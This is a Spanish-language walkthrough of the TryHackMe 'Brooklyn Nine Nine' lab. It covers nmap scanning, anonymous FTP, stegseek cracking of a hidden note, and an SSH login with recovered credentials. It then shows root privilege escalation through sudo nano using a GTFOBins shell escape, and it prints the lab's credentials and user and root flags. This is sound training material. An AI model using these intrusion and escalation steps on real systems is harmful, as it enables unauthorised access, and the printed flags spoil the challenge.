---
title: "Brooklyn Nine Nine - TryHackMe Writeup"
date: 2025-05-03 10:00:00 +0100
categories: [Linux, Easy]
tags: [tryhackme, linux, ftp, ssh, steganography, stegseek, nano, privilege-escalation]
image: /imagenes/Brooklyn%20Nine%20Nine.png
---

# Brooklyn Nine Nine CTF

---

## Fase 1 — Enumeración

### Fase 1.1 — Nmap Port Scan

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
nmap -sC -sV <TARGET_IP>
```

**Puertos descubiertos:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu |
| 80/tcp | HTTP | Apache 2.4.29 Ubuntu |

**Hallazgos críticos:**
- FTP → **Anonymous login allowed**
- FTP → archivo `note_to_jake.txt` visible en el directorio raíz

![fase1.1_nmap_scan.png](/linux/Brooklyn%20Nine%20Nine/fase1.1_nmap_scan.png)

---

### Fase 1.2 — Acceso FTP Anónimo

**Comandos ejecutados:**
```bash
# [MÁQUINA ATACANTE]
ftp <TARGET_IP>
# Usuario: anonymous
# Password: (vacío)
ls
get note_to_jake.txt
exit
cat note_to_jake.txt
```

**Hallazgos:**
- Nota de Amy a Jake: *"Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine"*
- **Usuarios identificados: `jake`, `holt`**
- Jake tiene contraseña débil → candidato a fuerza bruta

![fase1.2_ftp_anonymous.png](/linux/Brooklyn%20Nine%20Nine/fase1.2_ftp_anonymous.png)

---

### Fase 1.3 — Enumeración Web y Código Fuente

**URL visitada:**
```
http://<TARGET_IP>
# Clic derecho → Ver código fuente
```

**Hallazgos críticos:**
- Página web muestra imagen `brooklyn99.jpg`
- Comentario oculto en código fuente: `<!--Have you ever heard of steganography?-->` → confirma que la imagen contiene datos ocultos

![fase1.3_web_source.png](/linux/Brooklyn%20Nine%20Nine/fase1.3_web_source.png)

---

### Fase 1.4 — Descarga de Imagen y Extracción con Stegseek

**Comandos ejecutados:**
```bash
# [MÁQUINA ATACANTE]
wget http://<TARGET_IP>/brooklyn99.jpg
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

**Hallazgos:**
- Passphrase encontrada: **`admin`**
- Archivo extraído: `brooklyn99.jpg.out` → contiene `note.txt`

![fase1.4_stegseek.png](/linux/Brooklyn%20Nine%20Nine/fase1.4_stegseek.png)

---

### Fase 1.5 — Credenciales de holt en note.txt

**Comando ejecutado:**
```bash
# [MÁQUINA ATACANTE]
cat brooklyn99.jpg.out
```

**Hallazgos críticos:**
- El archivo oculto confirma que `holt` es un usuario válido del sistema

| Campo | Valor |
|-------|-------|
| Usuario | holt |
| **Password** | **fluffydog12@ninenine** |

![fase1.5_note_holt.png](/linux/Brooklyn%20Nine%20Nine/fase1.5_note_holt.png)

---

## Fase 2 — Foothold

### Fase 2.1 — SSH como holt y User Flag

**Comandos ejecutados:**
```bash
# [MÁQUINA ATACANTE]
ssh holt@<TARGET_IP>
# Password: fluffydog12@ninenine

# [MÁQUINA OBJETIVO - como holt]
whoami
cat user.txt
```

**Hallazgos:**
- Acceso exitoso como `holt`
- Hostname: `brookly_nine_nine`
- Archivo `nano.save` presente → pista del vector de PrivEsc via nano

**User Flag:**
```
ee11cbb19052e40b07aac0ca060c23ee
```

![fase2.1_ssh_holt_userflag.png](/linux/Brooklyn%20Nine%20Nine/fase2.1_ssh_holt_userflag.png)

---

## Fase 3 — Escalada de Privilegios

### Fase 3.1 — Identificación del Vector PrivEsc (sudo -l)

**Comando ejecutado:**
```bash
# [MÁQUINA OBJETIVO - como holt]
sudo -l
```

**Hallazgo crítico:**

| Usuario | Comando | Privilegio |
|---------|---------|------------|
| holt | `/bin/nano` | **(ALL) NOPASSWD** |

**Vector:** holt puede ejecutar nano como root sin contraseña → GTFOBins → shell de root

![fase3.1_sudo_l.png](/linux/Brooklyn%20Nine%20Nine/fase3.1_sudo_l.png)

---

### Fase 3.2 — PrivEsc via sudo nano → Root Flag

**Comandos ejecutados:**
```bash
# [MÁQUINA OBJETIVO - como holt]
sudo /bin/nano
```

**Dentro de nano:**
1. Pulsar `Ctrl+R`
2. Pulsar `Ctrl+X`
3. Escribir: `reset; sh 1>&0 2>&0`
4. Pulsar Enter → shell de root obtenida

```bash
# [MÁQUINA OBJETIVO - como ROOT]
whoami
cat /root/root.txt
```

**Root Flag:**
```
63a9f0ea7bb98050796b649e85481845
```

![fase3.2_root_flag.png](/linux/Brooklyn%20Nine%20Nine/fase3.2_root_flag.png)
